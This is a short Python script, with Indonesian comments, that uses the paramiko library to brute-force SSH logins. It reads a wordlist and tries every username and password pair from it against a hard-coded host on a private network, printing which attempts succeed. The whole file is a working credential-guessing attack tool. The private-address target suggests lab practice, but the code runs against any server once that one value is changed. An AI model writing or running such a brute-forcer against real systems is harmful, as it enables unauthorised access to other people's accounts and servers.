import paramiko

# readfile-> buat ambil wordlist
# bruteforce

WORDLIST = []
TARGET = '192.168.182.128'
PORT = 22


def stripword(word):
    # root\n -> root
    return word.rstrip()


def readfile():
    global WORDLIST
    # open file
    f = open("wordlist.txt", "r")
    WORDLIST = f.readlines()
    WORDLIST = list(map(stripword, WORDLIST))
    f.close()


def bruteforce():
    for username in WORDLIST:
        for password in WORDLIST:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh_client.connect(hostname=TARGET, port=PORT,
                                   username=username, password=password)
            except:
                print(f"{username}:{password} connection failed")
            else:
                print(f"{username}:{password} connection Success")


def main():
    readfile()
    bruteforce()
    pass


if __name__ == "__main__":
    main()
